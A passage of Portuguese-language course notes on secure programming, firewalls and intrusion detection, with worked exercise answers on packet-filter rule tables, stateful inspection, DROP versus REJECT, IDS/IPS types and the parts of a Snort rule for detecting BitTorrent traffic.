**Concorrência (slide 611):** **condições de corrida** ocorrem quando vários processos ou
threads competem por acesso não controlado a recursos compartilhados (memória); sem
sincronização, valores são corrompidos ou mudanças perdidas. Uso incorreto de primitivas de
sincronização causa **impasse** (deadlock, espera circular), que atacantes podem disparar de
propósito para DoS. Mitigação: escolha correta das primitivas, e projeto que limita as áreas
compartilhadas.

### 3.6 Interação com o sistema operacional

**O ambiente (slide 612):** o SO media o acesso a recursos e constrói o ambiente do processo:
código, dados, argumentos de linha de comando e variáveis de ambiente. Tudo isso precisa ser
tratado como entrada externa e validado. Recursos têm permissões de usuário e grupo;
programas precisam de acesso apropriado, e acesso excessivo é perigoso.

**Variáveis de ambiente (slide 613):** strings herdadas do processo pai (PATH, IFS,
LD_LIBRARY_PATH). São um ponto de entrada para dados não confiáveis.

- **Ataque ao PATH:** o atacante muda o PATH para que um script privilegiado rode um
  programa malicioso (um `grep` falso) em vez do utilitário do sistema.
- **Ataque ao LD_LIBRARY_PATH:** carregar bibliotecas dinâmicas maliciosas em programas
  privilegiados.
- **Mitigação:** evitar scripts de shell privilegiados (difíceis de proteger); usar
  programas compilados de encapsulamento que limpam o ambiente antes de chamar scripts;
  redefinir as variáveis críticas para valores seguros conhecidos no início.

**Menor privilégio (slide 614):** programas rodam com os privilégios mínimos necessários. Se
um programa privilegiado (root) é comprometido, o atacante ganha controle total. Práticas:
preferir privilégios de grupo a privilégios de usuário (mais fácil de auditar); programas
privilegiados como servidores web não devem ser donos de todos os seus arquivos, só ler onde
necessário; servidores não devem rodar como root o tempo todo: usar root só para vincular
portas baixas, depois abandonar os privilégios.

**Modularização e isolamento (slide 615):** particionar programas grandes em módulos menores
e conceder privilégios elevados só aos módulos que precisam, brevemente (o servidor de
correio Postfix). **Sandboxing e chroot:** rodar programas vulneráveis em ambientes isolados.
Uma **jaula chroot** limita a visão do sistema de arquivos do programa a um diretório.
Limitação: difícil de configurar; feito errado, o programa escapa ou falha.

**Chamadas de sistema e suposições (slide 616):** o SO e as bibliotecas fazem buffer e
reordenam por desempenho, o que pode conflitar com a segurança. Caso: **apagamento seguro de
arquivos (shredding)**. Sobrescrever um arquivo não garante que os dados antigos sumiram:
buffers da biblioteca de E/S, buffers do sistema de arquivos e controladores de disco
inteligentes (que evitam reescrever o mesmo bloco, especialmente em SSDs e flash) intervêm.
O programador seguro precisa entender e controlar essas camadas, por exemplo forçar flush e sync.

### 3.7 Saída do programa

**Natureza da saída (slide 617):** binária (protocolos de rede, estruturas gráficas) ou
textual (HTML, conjuntos de caracteres). Precisa obedecer estritamente ao formato e à
interpretação esperados pelo dispositivo ou usuário. **O problema da origem comum:** os
usuários supõem que a saída foi gerada e validada pelo programa confiável. Isso falha quando
o programa aceita entrada de um usuário e a mostra a outro (comentários, fóruns) sem sanitização.

**Ataques pela saída (slide 618):**

- **Ataques a terminais (legado, VT100):** sequências de escape em texto malicioso podiam
  reprogramar teclas de função para rodar comandos arbitrários (apagar arquivos) quando a
  vítima via o texto.
- **XSS:** explora a confiança do navegador no site de origem. Dados de terceiros não
  sanitizados rodam scripts (JavaScript) no navegador da vítima.

**Mitigação (slide 619):** programas que retransmitem dados de terceiros são responsáveis
pela sua segurança. Preferir **lista branca** de conteúdo sabidamente seguro a remover o
perigoso. Conjuntos de caracteres diferentes mudam a interpretação dos metacaracteres, então
a codificação precisa ser especificada explicitamente (o cabeçalho `Content-Type`), ou o
navegador assume um padrão inseguro. O ataque mira o usuário ou o dispositivo de exibição,
não o servidor, mas danifica a reputação do software.

Material externo:

- OWASP, artigo: [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
  A lista atual de riscos em aplicações web à qual o slide 566 se refere.
- MITRE, artigo: [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
  A lista por trás das três categorias dos slides 567 a 570.
- Codenomicon, site: [The Heartbleed Bug](https://heartbleed.com/)
  A página de divulgação original da leitura excessiva do OpenSSL de 2014.

---

## 4. Lista de exercícios 8, resolvida (firewalls)

### Seção 1: conceitos de segurança e estratégia de defesa

**1. Defina o perímetro de rede. Qual é o papel fundamental do firewall entre as redes
confiável e não confiável?**

O **perímetro** é a fronteira entre a rede interna, protegida (a rede das instalações,
confiável) e a rede externa (a Internet, não confiável), slides 455 e 462. O firewall fica
nessa fronteira e estabelece um **enlace controlado**: todo o tráfego nos dois sentidos passa
por ele (o ponto de gargalo), só passa o tráfego autorizado pela política de segurança local,
e o próprio firewall é imune a penetração (os três objetivos de [BELL94], slide 456). Ele
protege o lado confiável de ataques vindos da Internet enquanto ainda permite à organização
alcançar o mundo externo (o dilema, slide 450).

**2. A diferença entre a política de segurança (nível estratégico) e as regras do firewall
(nível técnico). Quem dita quem?**

A **política de segurança** declara, no nível da organização, quais tipos de tráfego a
organização precisa suportar e quais riscos aceita. Ela vem da **avaliação de risco** e da
política de segurança da informação (slide 457). A **política de acesso** do firewall é
derivada dela: uma especificação ampla, refinada em elementos de filtro específicos, e
implementada na topologia do firewall. As **regras** são a implementação técnica desses
elementos de filtro: endereços, portas, protocolos, ações. A política dita as regras. Uma
regra sem política por trás é um erro de configuração à espera de acontecer (fraqueza 5 da
NIST SP 800-41, slide 475).

**3. O que é a superfície de ataque? Como um filtro positivo a reduz?**

Os slides não definem o termo. Além dos slides: a superfície de ataque é o conjunto de pontos
(serviços, portas, interfaces, entradas) pelos quais um atacante pode tentar entrar ou
extrair dados. Um **filtro positivo** passa só os pacotes que atendem a critérios específicos
e termina com um **deny** (slide 464). Todo serviço não autorizado explicitamente fica
fechado, então as portas e serviços alcançáveis de fora encolhem até a lista da política.
Essa é a capacidade 1 do firewall: proíbe serviços vulneráveis de entrar ou sair (slide 460).
Um filtro negativo, com um allow no final, deixa aberto todo serviço que ninguém pensou em bloquear.

**4. Defesa em profundidade: com um firewall de borda robusto, por que ainda proteger os
hosts? Cite uma ameaça que o firewall de borda não detém.**

Por causa das quatro limitações do slide 461. O firewall não detém ataques que o
**contornam** (um sistema interno com enlace próprio a um provedor, um enlace direto a um
parceiro), não detém totalmente **ameaças internas** (um funcionário descontente, um
funcionário enganado por phishing), não detém **redes sem fio inseguras** alcançadas de fora,
e não detém um **dispositivo portátil infectado (BYOD)** trazido de fora. Além disso, tráfego
cifrado por uma VPN que termina atrás do firewall é invisível para ele (slide 506). Qualquer
uma dessas ameaças cai dentro do perímetro, onde só restam as defesas do host: antivírus
(HIDS por assinatura, slide 548), correções, firewalls de host (slide 493). Defesa em
profundidade significa que a falha de uma camada não expõe tudo (slide 455). Ameaça de
exemplo: o laptop de um funcionário infectado em casa e conectado à LAN.

### Seção 2: filtros de pacotes

**1. Como funciona um filtro de pacotes sem estado. Que informação ele usa?**

Ele aplica uma lista de regras a cada pacote IP, de entrada e de saída, e o encaminha ou
descarta (slide 465). As regras comparam os cabeçalhos IP e TCP ou UDP, de cima para baixo;
a primeira correspondência decide, e sem correspondência a ação padrão se aplica (slide 466).
Informação usada, só camadas 3 e 4: endereço IP de origem, endereço IP de destino, porta de
origem e de destino, o campo de protocolo IP (TCP, UDP, ICMP), e a interface. Ele não guarda
memória entre pacotes.

**2. Uma vantagem e uma limitação do filtro sem estado.**

Vantagem (slide 473): **velocidade**, porque não inspeciona a carga útil; também simplicidade
e transparência para os usuários. Limitação (slides 474 e 475): não examina dados das camadas
superiores, então não bloqueia ataques a vulnerabilidades de aplicação ou comandos
específicos de aplicação. Outras limitações: registro limitado, sem autenticação avançada de
usuário, vulnerável a falsificação de IP e fragmentos minúsculos, fácil de configurar errado.

**3. O problema do tráfego de retorno e como o filtro com estado o resolve.**

Um servidor usa uma porta bem conhecida abaixo de 1024, um cliente uma porta temporária
acima de 1024, por exemplo 49152 (slide 478). Para deixar a resposta da porta 25 chegar à
porta 49152, um filtro sem estado precisa permitir tráfego de entrada para **todas** as
portas altas (regra 4 da Tabela 9.1), o que deixa um atacante alcançar qualquer serviço
interno acima de 1023, como um proxy na 8080 (slide 469). O filtro com estado mantém uma
**tabela de estado** das conexões TCP de saída ativas, e permite tráfego de entrada para uma
porta alta **só** se o pacote corresponde a uma entrada (slide 479). A resposta a uma conexão
que o lado interno abriu é aceita; um pacote não solicitado para uma porta alta não é.

**4. Defina o filtro de pacotes com estado.**

Um firewall que revisa a mesma informação de cabeçalho L3 e L4 que um filtro de pacotes
**e** registra o estado de cada conexão TCP (estabelecida, encerrando), em um diretório de
conexões ativas (slide 480). Ele aperta as regras para o tráfego TCP ao vincular pacotes de
entrada a conexões que existem. Alguns produtos também rastreiam números de sequência TCP
contra sequestro de sessão, e fazem inspeção limitada de aplicação para protocolos como FTP,
IM e SIPS.

**5. O que é a tabela de estado e qual é a sua função para um pacote de entrada?**

A tabela de estado (Tabela 9.2, slide 481) contém uma entrada por conexão estabelecida:
endereço de origem, porta de origem, endereço de destino, porta de destino, estado da
conexão. Para um pacote de entrada para uma porta alta, o firewall procura uma entrada com os
endereços e portas correspondentes. Uma correspondência significa que o pacote pertence a uma
conexão que o lado interno abriu, e ele é aceito. Sem correspondência o pacote é não
solicitado, e a lista de regras ou a política padrão decide, normalmente descartar.

**6. Uma regra de bloqueio é adicionada a um firewall com estado e a tabela de estado não é
modificada. O que acontece com uma comunicação já em andamento? Justifique.**

A comunicação **continua** até encerrar ou sua entrada expirar. Justificativa pelo slide 479:
o firewall com estado aceita um pacote que corresponde a uma entrada existente da tabela de
estado. A entrada foi criada quando a conexão foi estabelecida, antes da nova regra, então os
pacotes dessa conexão continuam correspondendo a ela. A nova regra só afeta conexões
**novas**, cujo primeiro pacote passa pela lista de regras e é bloqueado, então nenhuma
entrada é criada. Além dos slides: é assim que as implementações comuns se comportam
(netfilter com uma regra "accept ESTABLISHED" antes das regras de bloqueio). Para deter a
conexão em andamento, o administrador precisa também limpar a entrada da tabela de estado.

### Seção 3: firewalls de aplicação (proxies)

**1. Em qual camada da pilha TCP/IP o proxy de aplicação opera?**

Na **camada de aplicação**, o topo da pilha. Ele retransmite tráfego de nível de aplicação
como Telnet, FTP, SMTP e HTTP (slide 482), e a política que impõe se baseia no protocolo de
aplicação (slide 458).

**2. Compare firewalls de aplicação com filtros de pacotes sem estado e com estado.**

Veja a tabela da seção 1.10. O filtro de pacotes examina cabeçalhos L3 e L4 de cada pacote,
sem estado e sem carga útil: rápido, simples, transparente, mas cego a ataques de aplicação,
fraco em registro, vulnerável a falsificação e erro de configuração. O filtro com estado
acrescenta o estado da conexão e resolve o problema das portas altas, com inspeção limitada
da carga útil. O proxy de aplicação emenda duas conexões e vê todo o diálogo de aplicação:
controle granular de comandos, registro completo no nível de aplicação, mais seguro porque
analisa umas poucas aplicações permitidas em vez de incontáveis combinações de cabeçalho
(slide 483). Seu custo é sobrecarga de processamento nas duas conexões, e precisa de código
de proxy para cada aplicação suportada. O híbrido do slide 484 usa um proxy na entrada e um
proxy de circuito mais barato na saída.

**3. O que o firewall de aplicação pode inspecionar que os filtros de pacotes não podem? Exemplo.**

A **carga útil** e os comandos e conteúdo da aplicação. Fraqueza 1 do filtro de pacotes
(slide 474): se a aplicação é permitida, todas as suas funções são permitidas. O proxy pode
suportar só recursos específicos: permitir HTTP **GET** e negar **POST** (slide 483),
verificar correio SMTP contra spam, ou permitir requisições HTTP só a sites autorizados
(slide 458). Ele também pode autenticar o usuário antes de retransmitir (slide 482), o que o
filtro de pacotes não pode fazer.

**4. Como essa posição permite ao firewall de aplicação proteger contra ataques a
vulnerabilidades do software servidor?**

Não há conexão fim a fim: o cliente fala com o proxy, e o próprio proxy abre a conexão com o
servidor (slide 482). Um exploit alcança portanto o **analisador do proxy** primeiro, não o
servidor. O proxy implementa só um **subconjunto** dos comandos da aplicação (slide 490) e só
os recursos que o administrador aceita, então requisições malformadas ou não suportadas não
são retransmitidas. O proxy é um programa muito pequeno, menos de 1.000 linhas contra 20.000
de uma aplicação de correio, então é mais fácil de auditar (slide 491), roda sem privilégios,
sem acesso a disco, em um host bastião reforçado (slide 492). Uma vulnerabilidade no software
servidor só é alcançável por requisições que o proxy escolheu encaminhar.

### Seção 4: lógica de filtragem e implementação de política

**1. Defina o filtro positivo.**

Um filtro que permite só os pacotes que atendem a critérios específicos e rejeita todo o
resto: tem um **deny** implícito no final (slide 464). Implementa a política de **descarte
padrão**: "o que não é expressamente permitido é proibido" (slide 466).

**2. Defina o filtro negativo.**

Um filtro que rejeita qualquer pacote que atende a certos critérios e permite todo o resto:
tem um **allow** implícito no final (slide 464). Implementa a política de **encaminhamento
padrão**: "o que não é expressamente proibido é permitido" (slide 466).

**3. Filtro positivo para o servidor web 172.16.20.5.**

| Regra | IP origem  | Porta origem | IP destino  | Porta destino | Ação                 |
| ----- | ---------- | ------------ | ----------- | ------------- | -------------------- |
| 1     | Qualquer   | > 1023       | 172.16.20.5 | 80            | Permit               |
| 2     | Qualquer   | > 1023       | 172.16.20.5 | 443           | Permit               |
| 3     | 10.0.0.100 | > 1023       | 172.16.20.5 | 22            | Permit               |
| 4     | Qualquer   | Qualquer     | Qualquer    | Qualquer      | **Deny** (implícito) |

A regra implícita no final é **deny all**. FTP (21) e "outros" não precisam de regra: caem no
deny final. Em um filtro sem estado as respostas também precisam de regras, com o flag ACK
(slide 471): origem 172.16.20.5 porta 80, 443 ou 22 para destino qualquer, porta > 1023, ACK
ligado, permit. Em um filtro com estado a tabela de estado trata as respostas.

**4. Filtro negativo para o mesmo servidor.**

| Regra | IP origem  | Porta origem | IP destino  | Porta destino | Ação                  |
| ----- | ---------- | ------------ | ----------- | ------------- | --------------------- |
| 1     | 10.0.0.100 | Qualquer     | 172.16.20.5 | 22            | Permit                |
| 2     | Qualquer   | Qualquer     | 172.16.20.5 | 22            | Deny                  |
| 3     | Qualquer   | Qualquer     | 172.16.20.5 | 21            | Deny                  |
| 4     | Qualquer   | Qualquer     | 172.16.20.5 | 1 a 79        | Deny                  |
| 5     | Qualquer   | Qualquer     | 172.16.20.5 | 81 a 442      | Deny                  |
| 6     | Qualquer   | Qualquer     | 172.16.20.5 | 444 a 65535   | Deny                  |
| 7     | Qualquer   | Qualquer     | Qualquer    | Qualquer      | **Allow** (implícito) |

A regra implícita no final é **allow all**. A regra 1 precisa vir antes da regra 2, porque as
regras executam de cima para baixo e o SSH do administrador é a exceção. As regras 4 a 6
existem só porque o requisito diz "outros: não". Um filtro negativo não consegue expressar
isso sem enumerar cada porta a bloquear (a regra 3 fica então redundante com a regra 4,
mantida por clareza).

**5. Prós e contras das duas implementações.**

| Aspecto              | Filtro positivo (descarte padrão)           | Filtro negativo (encaminhamento padrão)     |
| -------------------- | ------------------------------------------- | ------------------------------------------- |
| Segurança            | Conservador: serviço esquecido fica fechado | Reduzida: um serviço esquecido fica aberto  |
| Regras               | 3 regras curtas, uma por serviço permitido  | 6 regras com faixas para "outros: não"      |
| Novo serviço         | Adicionar uma regra permit                  | Abrir um buraco em uma faixa, risco de erro |
| Nova ameaça          | Já bloqueada                                | O administrador precisa reagir a cada uma   |
| Usuários             | Veem um obstáculo no início                 | Mais fácil para os usuários finais          |
| Erro de configuração | Uma regra errada abre um serviço            | Uma faixa errada abre muitos                |
| Quem (slide 466)     | Empresas e governo                          | Organizações abertas, universidades         |

Para um servidor web corporativo o filtro positivo é a escolha correta: a tabela de
requisitos é ela mesma uma lista branca.

### Seção 5: DROP versus REJECT

**1. A diferença técnica entre DROP (deny, descarte) e REJECT. O que o firewall envia de volta?**

Nos slides, descartar é a ação do filtro de pacotes (slide 465) e o modo furtivo descarta
pacotes não solicitados para que o sistema pareça ausente (slide 500). Além dos slides:
**DROP** descarta o pacote em silêncio e **nada** envia de volta. **REJECT** descarta o
pacote e envia um erro de volta ao remetente: uma mensagem de erro ICMP (destino ou porta
inalcançável, ou administrativamente proibido) para UDP e outros protocolos, ou um reset TCP
para TCP.

**2. Qual flag TCP a resposta do REJECT carrega?**

Além dos slides: o flag **RST** (reset). O firewall simula um host que recusa a conexão, que
é exatamente o que um host faz quando um SYN chega a uma porta fechada.

**3. Por que DROP é uma técnica furtiva contra varreduras de portas? Como o silêncio afeta
a conclusão e o tempo do atacante comparado ao REJECT?**

Com REJECT o atacante recebe uma resposta imediata para cada sondagem: um RST significa
"porta fechada, host vivo", então a varredura termina rápido e o atacante aprende quais hosts
existem e quais portas estão filtradas versus fechadas. Com DROP nada volta. O atacante não
consegue distinguir uma porta filtrada de um host que não existe, que é o modo furtivo do
slide 500: o sistema parece não estar presente. O scanner do atacante precisa esperar um
**timeout** em cada sondagem e normalmente retransmitir, então a varredura demora muito
mais, e o resultado é "filtrada", não "fechada". O custo fica do lado do atacante, e o
firewall não revela nada.

---

## 5. Lista de exercícios 9, resolvida (IDS/IPS)

### Seção 1: detecção e prevenção de intrusão

**1. Defina uma intrusão.**
Uma intrusão de segurança é um ato não autorizado de contornar os mecanismos de segurança de
um sistema (slide 522). Exemplos da NIST SP 800-61 (slides 513 e 514): comprometimento remoto
de root de um servidor de correio, pichação web, quebra de senhas, cópia de um banco de dados
de cartões, captura de senhas com sniffer, engenharia social.

**2. Defina um IDS.**

Um sistema de detecção de intrusão: uma função de hardware ou software que coleta e analisa
informação de várias áreas de um computador ou rede para identificar possíveis intrusões
(slide 522). Três componentes lógicos: sensores (coletam), analisadores (decidem), interface
de usuário (slide 523). Classificado como HIDS, NIDS ou distribuído (slide 524).

**3. Defina um IPS.**

Um sistema de prevenção de intrusão: um IDS colocado em linha, de modo que o tráfego precisa
passar por ele, e que **bloqueia** um ataque ao detectá-lo (slide 552). Combina detecção com
uma resposta automática.

**4. A diferença fundamental entre eles em termos de ação.**

O IDS **detecta e alerta**: registra o evento suspeito e notifica o administrador, que
responde (slide 543: detectar, registrar, alertar). Pode rodar em um sensor passivo que vê
uma cópia do tráfego. O IPS **previne**: ele mesmo descarta ou bloqueia o tráfego, o que
exige um sensor em linha. O preço do IPS é que um falso positivo bloqueia tráfego legítimo,
e a posição em linha acrescenta atraso (slide 552).

**5. Por que um firewall de filtro de pacotes pode ser insuficiente para detecção de intrusão.**

O filtro de pacotes vê só cabeçalhos L3 e L4 (slide 465). Não consegue examinar a carga útil,
então não detecta ataques que usam vulnerabilidades de aplicação (slide 474), seus logs
guardam só endereços e tipo de tráfego (slide 474), não mantém contexto entre pacotes
(slide 478), e é contornado por falsificação e fragmentos minúsculos (slides 476 e 477). Um
ataque que chega em uma porta permitida, como um exploit dentro de uma requisição HTTP, passa
por ele. A detecção de intrusão precisa da carga útil (assinaturas como a opção `content` do
Snort), da sequência de pacotes (o padrão de uma varredura), e de dados do host (chamadas de
sistema, integridade de arquivos), que só um IDS coleta. Além disso, o firewall nunca vê
tráfego que o contorna nem atividade de internos (slide 461).

### Seção 2: detectar uma intrusão

**1. Defina e contraste detecção por assinatura e detecção de anomalia.**

- **Detecção por assinatura (ou heurística), detecção de mau uso:** um conjunto de padrões
  maliciosos conhecidos ou regras de ataque; o comportamento observado é comparado com eles,
  e uma correspondência significa um intruso (slide 540). Descreve o que é **ruim**.
- **Detecção de anomalia:** dados sobre o comportamento legítimo ao longo do tempo constroem
  uma linha de base do normal; o comportamento observado é comparado com o modelo e
  classificado como legítimo ou anômalo (slides 533 e 534). Descreve o que é **normal**. Tem
  uma fase de treinamento e uma fase de detecção, e três categorias de classificação:
  estatística, baseada em conhecimento, aprendizado de máquina (slide 535).

**2. Qual abordagem é mais eficaz para cada tipo de comportamento, e por quê?**

Para comportamento **conhecido, catalogado**: detecção por assinatura. É barata em execução,
amplamente aceita, e precisa quando a assinatura tem detalhe suficiente (slide 541). Para
comportamento **desconhecido**: detecção de anomalia. Um ataque novo não corresponde a
nenhuma assinatura, então só um desvio da linha de base o revela (slides 541 e 548). O custo
é uma taxa de falsos alarmes mais alta, porque o comportamento legítimo e o de ataque se
sobrepõem (slides 526 e 527).

**3. Assinatura versus anomalia em quatro critérios.**

- **Ataques de dia zero:** a detecção por assinatura não os detecta, não existe assinatura
  (slides 541 e 548). A detecção de anomalia pode, se o ataque desvia da linha de base.
- **Taxa de falsos positivos:** a detecção por assinatura é mais baixa, uma assinatura
  detalhada raramente corresponde a tráfego legítimo. A detecção de anomalia é mais alta: a
  sobreposição entre comportamento normal e de ataque (slide 527), a falácia da taxa-base
  (slide 529), e a taxa do aprendizado de máquina atualmente inaceitavelmente alta (slide 538).
- **Custo computacional e de manutenção:** a detecção por assinatura tem custo de execução
  relativamente baixo (slide 541), mas exige esforço significativo para identificar
  comportamento novo e escrever assinaturas. A detecção de anomalia depende da categoria:
  estatística é simples e barata (slide 536), baseada em conhecimento exige especialistas
  humanos e tempo para regras de alta qualidade (slide 537), aprendizado de máquina exige
  muito tempo e recursos para treinar, depois classifica com eficiência (slide 538).
- **Adaptabilidade a novas ameaças:** a detecção por assinatura precisa de uma nova
  assinatura para cada novo ataque. A detecção de anomalia se adapta, pois o modelo pode
  evoluir continuamente (slide 534), e o aprendizado de máquina é flexível e adaptável
  (slide 538). O requisito 6 de um IDS é adaptar-se a mudanças de comportamento ao longo do
  tempo (slide 531).

### Seção 3: NIDS e HIDS

**1. Defina e contraste HIDS e NIDS.**

- **HIDS:** uma camada especializada de software de segurança em um host vulnerável ou
  sensível (servidores de banco de dados, sistemas administrativos). Monitora a atividade
  dentro do sistema: rastros de chamadas de sistema, registros de auditoria, somas de
  verificação de integridade de arquivos, acesso ao Registro (slides 543 a 545). Propósitos:
  detectar, registrar, alertar. Usa as duas abordagens de análise.
- **NIDS:** monitora o tráfego em pontos selecionados da rede, pacote a pacote, em tempo
  real, em L3, L4 e L7. Parte do perímetro, focado em tentativas externas. Arquitetura:
  sensores, servidores de gerência, consoles (slide 550).
- **Contraste (slide 550):** o NIDS examina o tráfego de pacotes dirigido aos sistemas; o
  HIDS examina a atividade de usuários e software dentro de um host. O NIDS cobre muitos
  hosts com um sensor mas perde a carga útil cifrada (slide 552); o HIDS vê dados decifrados
  e eventos locais mas cobre um host e consome seus recursos.

**2. Qual abordagem para cada cenário, e por quê.**

- **Malware fazendo chamadas de sistema anômalas: HIDS.** Rastros de chamadas de sistema
  são a fonte preferida do HIDS (slide 544), e o STIDE compara as sequências de chamadas
  observadas com as normais (slide 547). A rede nunca vê uma chamada de sistema.
- **Varredura de portas na rede corporativa: NIDS.** Uma varredura é um padrão de pacotes
  para muitas portas ou hosts. O NIDS vê o tráfego de um segmento inteiro (slide 550), e um
  honeypot externo rastreia varreduras de endereços não usados também (slide 558).
- **Tentativas de exploit em um servidor web: NIDS.** As tentativas chegam como requisições
  HTTP pela rede e correspondem a assinaturas (regras do Snort, slide 542). Se o servidor
  usa HTTPS, o NIDS fica cego (slide 552) e um HIDS no servidor é necessário.
- **Acesso não autorizado a arquivos sensíveis: HIDS.** Somas de verificação de integridade
  de arquivos e registros de auditoria são fontes de host (slides 544 e 545), e honeyfiles
  geram alerta no acesso (slide 560). O NIDS vê uma transferência de arquivo só se ela cruza
  a rede em claro.

**3. O uso combinado de NIDS e HIDS pode melhorar a detecção nesses cenários? Justifique.**

Sim. Um IDS distribuído ou híbrido combina os sensores em um analisador central e identifica
e responde a intrusões melhor (slide 524), e um HIDS distribuído cooperando pela rede é a
defesa mais eficaz (slide 549).

- **Chamadas de sistema anômalas:** o HIDS detecta o malware; o NIDS acrescenta como ele
  chegou (um download, um link de spear-phishing) e se ele fala com um servidor de comando,
  o que também revela outros hosts infectados.
- **Varredura de portas:** o NIDS detecta a varredura; um HIDS nos hosts varridos confirma
  se alguma sondagem virou um login ou uma queda de serviço. Ganho pequeno, o NIDS sozinho
  é adequado.
- **Exploits no servidor web:** o maior ganho. O NIDS vê a requisição no fio, o HIDS vê o
  efeito no servidor (novos processos, chamadas de sistema, arquivos modificados), e cobre o
  caso HTTPS em que o NIDS fica cego.
- **Acesso a arquivos sensíveis:** o HIDS detecta o acesso; o NIDS detecta a exfiltração de
  um grande número de documentos para um repositório externo (slide 520), que é movimentação
  lateral ou roubo de dados visível só na rede.

**4. A operação passo a passo do Snort como NIDS, da captura do pacote ao alerta.**

Pela figura do slide 551:

1. O **tráfego de rede** chega ao sensor, por uma derivação ou uma posição em linha
   (slides 552 e 553).
2. O **decodificador de pacotes** analisa os cabeçalhos de protocolo (Ethernet, IP, TCP) em
   uma estrutura.
3. O **pré-processador** normaliza e remonta: fluxos, fragmentos, decodificação específica
   de protocolo, para que as regras vejam a carga útil real.
4. O **motor de detecção** compara o pacote com as **regras**: correspondência de cabeçalho
   (ação, protocolo, endereços, portas, sentido), depois as opções (`flow`, `content`,
   `depth`, `threshold`).
5. Em caso de correspondência, o **sistema de registro e alerta** gera o evento com o `msg`,
   `classtype` e `sid` da regra.
6. Os **módulos de saída** o escrevem no destino configurado: arquivo de alertas, log, banco
   de dados, ou console.

**5. Uma limitação significativa do NIDS com tráfego cifrado, e uma estratégia complementar.**

Com TLS/SSL o NIDS perde acesso à carga útil: não consegue ver comandos maliciosos dentro de
uma sessão HTTPS, então as assinaturas de conteúdo não correspondem (slide 552). Estratégias:
usar um **HIDS** nos pontos finais, que vê os dados depois da decifragem (chamadas de
sistema, arquivos, logs), como parte de um IDS distribuído (slides 524 e 549); terminar a
cifragem em um **proxy de aplicação** ou no firewall, onde o IPsec deve ficar para que o
firewall veja texto claro (slides 482 e 506), e colocar o sensor NIDS depois desse ponto; e
ainda usar o NIDS no que permanece visível, os cabeçalhos e os padrões de tráfego
(varreduras, taxas de conexão, fluxos). A conclusão do slide: o NIDS é só parte da solução,
defesa em profundidade.

### Seção 4: a regra do Snort

**1. O que cada parte do cabeçalho especifica.**

- **Ação:** `alert`, gerar um alerta quando a condição é atendida.
- **Protocolo e sentido:** `tcp`, só TCP; `->`, da origem à esquerda para o destino à direita.
- **Endereços de origem e destino:** `$HOME_NET`, a rede interna, para `$EXTERNAL_NET`, a
  rede externa.
- **Portas:** origem `any`; destino `![7680,1521]`, qualquer porta exceto 7680 e 1521.

**2. A função de cada opção.**

- `flow:established,to_server`: considera só conexões TCP já estabelecidas, no sentido do
  servidor (slide 563). Ignora o handshake e as respostas do servidor.
- `content:"|00 00 00 0d 06 00|"; depth:6`: busca a sequência de bytes 00 00 00 0d 06 00
  (as barras verticais marcam bytes hexadecimais), e só dentro dos primeiros 6 bytes da
  carga útil. O padrão precisa estar bem no início dos dados.
- `threshold: type limit, track by_dst, seconds 300, count 1`: evita alertas múltiplos, um
  alerta por endereço de destino a cada 300 segundos (slide 564).

**3. Qual abordagem de detecção essa regra representa? Justifique.**

**Detecção por assinatura.** A regra descreve um padrão conhecido de dados maliciosos ou
indesejados: uma sequência fixa de bytes em uma posição fixa da carga útil, em um estado de
protocolo conhecido, que é a mensagem de sincronização de peer do BitTorrent documentada na
página de protocolo referenciada. O comportamento é comparado com o padrão e uma
correspondência gera o alerta (slides 540 e 541). Nada na regra modela comportamento normal
ou uma linha de base, e não há fase de treinamento, então não é detecção de anomalia. O
Snort é o exemplo do slide de NIDS baseado em regras (slide 542). Seus limites são os limites
das assinaturas: um cliente que muda os bytes do handshake, ou roda na porta 7680, não é
detectado, e um protocolo novo precisa de uma regra nova.

---

## 6. Números e armadilhas

### Números para memorizar

| Item                                       | Valor                                                             |
| ------------------------------------------ | ----------------------------------------------------------------- |
| Estágios da evolução dos sistemas          | 6: mainframe, LAN, instalações, WAN corporativa, Internet, nuvem  |
| Objetivos de projeto do firewall [BELL94]  | 3: todo tráfego passa, só o autorizado passa, imune a si mesmo    |
| Características de política, NIST 800-41   | 4: endereço e protocolo, aplicação, identidade, atividade         |
| Capacidades / limitações do firewall       | 4 / 4                                                             |
| Campos de regra do filtro de pacotes       | 5: IP origem, IP destino, portas, protocolo IP, interface         |
| Vantagens / fraquezas do filtro de pacotes | 3 / 5 (NIST SP 800-41)                                            |
| Regras SMTP da Tabela 9.1                  | 5 regras; porta 25; respostas > 1023; regra 5 deny                |
| Exploração do SMTP                         | porta 5150 do atacante para o proxy interno na porta 8080         |
| Porta bem conhecida / porta do cliente     | < 1024 / > 1024 (exemplo 49152)                                   |
| Tipos de firewall                          | 4: filtro de pacotes, com estado, proxy de aplicação, de circuito |
| SOCKS                                      | versão 5, RFC 1928, porta TCP 1080                                |
| Tamanho do software do host bastião        | aplicação de correio 20.000+ linhas, proxy menos de 1.000         |
| Portas de dados FTP do firewall pessoal    | 1024 a 65535 depois de uma conexão a partir de 20 ou 21           |
| Implementações de firewall pessoal         | netfilter (Linux), pf (BSD, macOS), Windows Firewall              |
| Propósitos do firewall interno             | 3: filtragem mais estrita, DMZ nos dois sentidos, segmentação     |
| Classes de intruso                         | 4: criminosos cibernéticos, ativistas, APTs, outros               |
| Passos da metodologia de ataque            | 6: alvo, acesso, escalar, explorar, manter, apagar rastros        |
| Componentes lógicos do IDS                 | 3: sensores, analisadores, interface de usuário                   |
| Motivações / requisitos do IDS             | 3 / 9                                                             |
| Fases / categorias da detecção de anomalia | 2 (treinamento, detecção) / 3 (estatística, conhecimento, ML)     |
| Abordagens de aprendizado de máquina       | 6: bayesiana, Markov, neural, fuzzy, genética, agrupamento        |
| Fontes de dados do HIDS                    | 4: chamadas de sistema, auditoria, somas de arquivos, Registro    |
| Modos de sensor do NIDS                    | 2: em linha (IPS), passivo (derivação, NIC sem IP)                |
| Objetivos / posições do honeypot           | 3 / 3 (externo, DMZ, interno)                                     |
| Regra do Snort: portas excluídas           | 7680 e 1521                                                       |
| Regra do Snort: content / depth            | 00 00 00 0d 06 00 / 6 bytes                                       |
| Regra do Snort: threshold                  | 1 alerta por destino a cada 300 segundos                          |
| Regra do Snort: sid / rev                  | 2000334 / 14                                                      |
| Falhas de código do OWASP Top 10 no slide  | 5                                                                 |
| Categorias do CWE/SANS Top 25              | 3: interação insegura, recursos arriscados, defesas porosas       |
| Buffers fixos típicos                      | 512 ou 1024 bytes; o exemplo usa 10 bytes                         |
